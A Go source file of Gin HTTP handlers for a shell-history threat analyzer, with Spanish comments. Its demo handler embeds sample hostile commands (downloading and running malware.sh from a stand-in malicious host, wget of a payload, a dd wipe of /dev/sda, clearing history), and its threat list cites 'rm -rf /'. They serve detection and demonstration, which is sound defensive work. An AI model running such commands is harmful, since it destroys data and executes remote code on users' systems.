package handlers

import (
	"net/http"
	"time"

	"terminal-history-analyzer/internal/lexer"
	"terminal-history-analyzer/internal/models"
	"terminal-history-analyzer/internal/parser"
	"terminal-history-analyzer/internal/semantic"

	"github.com/gin-gonic/gin"
)

// UploadHistory maneja la subida de archivos de historial
func UploadHistory(c *gin.Context) {
	file, header, err := c.Request.FormFile("file")
	if err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "No se pudo leer el archivo",
		})
		return
	}
	defer file.Close()

	// Verificar tamaño del archivo (máximo 10MB)
	if header.Size > 10*1024*1024 {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "El archivo es demasiado grande (máximo 10MB)",
		})
		return
	}

	// Leer contenido del archivo
	content := make([]byte, header.Size)
	_, err = file.Read(content)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{
			"error": "Error al leer el archivo",
		})
		return
	}

	// Analizar contenido
	result := analyzeContent(string(content))

	c.JSON(http.StatusOK, result)
}

// AnalyzeText maneja el análisis de texto directo
func AnalyzeText(c *gin.Context) {
	var request models.UploadRequest

	if err := c.ShouldBindJSON(&request); err != nil {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "Formato de datos inválido",
		})
		return
	}

	if request.Content == "" {
		c.JSON(http.StatusBadRequest, gin.H{
			"error": "El contenido no puede estar vacío",
		})
		return
	}

	// Analizar contenido
	result := analyzeContent(request.Content)

	c.JSON(http.StatusOK, result)
}

// GetDemoAnalysis devuelve un análisis de demostración
func GetDemoAnalysis(c *gin.Context) {
	demoContent := `cd /home/user
ls -la
sudo rm -rf /tmp/*
curl -o malware.sh http://malicious-site.com/script.sh
chmod +x malware.sh
./malware.sh
ssh root@192.168.1.100
wget https://suspicious-domain.com/payload
dd if=/dev/zero of=/dev/sda
history -c`

	result := analyzeContent(demoContent)
	c.JSON(http.StatusOK, result)
}

// GetKnownCommands devuelve la lista de comandos conocidos
func GetKnownCommands(c *gin.Context) {
	commands := map[string]interface{}{
		"safe": []string{
			"ls", "cd", "pwd", "echo", "cat", "grep", "find", "head", "tail",
			"sort", "uniq", "wc", "diff", "file", "which", "whereis",
		},
		"dangerous": []string{
			"rm", "sudo", "chmod", "chown", "dd", "mkfs", "fdisk",
			"passwd", "su", "mount", "umount", "crontab",
		},
		"network": []string{
			"wget", "curl", "ssh", "scp", "rsync", "netcat", "nc", "telnet",
		},
	}

	c.JSON(http.StatusOK, commands)
}

// GetThreatTypes devuelve los tipos de amenazas detectables
func GetThreatTypes(c *gin.Context) {
	threats := []map[string]interface{}{
		{
			"type":        "dangerous_deletion",
			"level":       "CRITICAL",
			"description": "Comandos que pueden eliminar archivos importantes del sistema",
			"examples":    []string{"rm -rf /", "sudo rm -rf /*"},
		},
		{
			"type":        "privilege_escalation",
			"level":       "HIGH",
			"description": "Comandos que intentan elevar privilegios",
			"examples":    []string{"sudo su -", "sudo -s"},
		},
		{
			"type":        "suspicious_download",
			"level":       "MEDIUM",
			"description": "Descargas desde dominios sospechosos",
			"examples":    []string{"curl http://malicious.com/script.sh"},
		},
		{
			"type":        "network_connection",
			"level":       "LOW",
			"description": "Conexiones de red que podrían ser sospechosas",
			"examples":    []string{"ssh unknown@192.168.1.1"},
		},
	}

	c.JSON(http.StatusOK, threats)
}

// analyzeContent realiza el análisis completo del contenido
func analyzeContent(content string) *models.AnalysisResult {
	startTime := time.Now()

	// Análisis léxico
	lex := lexer.NewLexer(content)
	tokens, lexErrors := lex.Tokenize()

	// Análisis sintáctico
	p := parser.NewParser(tokens)
	commands, parseErrors, warnings := p.Parse()

	// Análisis semántico
	analyzer := semantic.NewAnalyzer()
	threats, patterns, anomalies := analyzer.Analyze(commands)

	// Estadísticas
	commandFreq := calculateCommandFrequency(commands)
	threatCount := calculateThreatCount(threats)
	tokenStats := calculateTokenStats(tokens)

	processingTime := time.Since(startTime)

	return &models.AnalysisResult{
		Summary: struct {
			TotalCommands    int                        `json:"total_commands"`
			UniqueCommands   int                        `json:"unique_commands"`
			ThreatCount      map[models.ThreatLevel]int `json:"threat_count"`
			MostUsedCommands []models.CommandFrequency  `json:"most_used_commands"`
			ProcessingTime   time.Duration              `json:"processing_time"`
		}{
			TotalCommands:    len(commands),
			UniqueCommands:   len(getUniqueCommands(commands)),
			ThreatCount:      threatCount,
			MostUsedCommands: commandFreq,
			ProcessingTime:   processingTime,
		},
		LexicalAnalysis: struct {
			Tokens     []models.Token           `json:"tokens"`
			TokenStats map[models.TokenType]int `json:"token_stats"`
			Errors     []models.LexicalError    `json:"errors"`
		}{
			Tokens:     tokens,
			TokenStats: tokenStats,
			Errors:     lexErrors,
		},
		SyntaxAnalysis: struct {
			Commands    []models.CommandAST  `json:"commands"`
			ParseErrors []models.SyntaxError `json:"parse_errors"`
			Warnings    []string             `json:"warnings"`
		}{
			Commands:    commands,
			ParseErrors: parseErrors,
			Warnings:    warnings,
		},
		SemanticAnalysis: struct {
			Threats   []models.ThreatDetection `json:"threats"`
			Patterns  []models.PatternMatch    `json:"patterns"`
			Anomalies []models.Anomaly         `json:"anomalies"`
		}{
			Threats:   threats,
			Patterns:  patterns,
			Anomalies: anomalies,
		},
	}
}

// Funciones auxiliares para estadísticas
func calculateCommandFrequency(commands []models.CommandAST) []models.CommandFrequency {
	freq := make(map[string]int)

	for _, cmd := range commands {
		freq[cmd.Command]++
	}

	var result []models.CommandFrequency
	for cmd, count := range freq {
		result = append(result, models.CommandFrequency{
			Command: cmd,
			Count:   count,
		})
	}

	// Ordenar por frecuencia (implementación simple)
	for i := 0; i < len(result)-1; i++ {
		for j := i + 1; j < len(result); j++ {
			if result[i].Count < result[j].Count {
				result[i], result[j] = result[j], result[i]
			}
		}
	}

	// Retornar los 10 más frecuentes
	if len(result) > 10 {
		result = result[:10]
	}

	return result
}

func calculateThreatCount(threats []models.ThreatDetection) map[models.ThreatLevel]int {
	count := make(map[models.ThreatLevel]int)

	for _, threat := range threats {
		count[threat.Level]++
	}

	return count
}

func calculateTokenStats(tokens []models.Token) map[models.TokenType]int {
	stats := make(map[models.TokenType]int)

	for _, token := range tokens {
		stats[token.Type]++
	}

	return stats
}

func getUniqueCommands(commands []models.CommandAST) map[string]bool {
	unique := make(map[string]bool)

	for _, cmd := range commands {
		unique[cmd.Command] = true
	}

	return unique
}
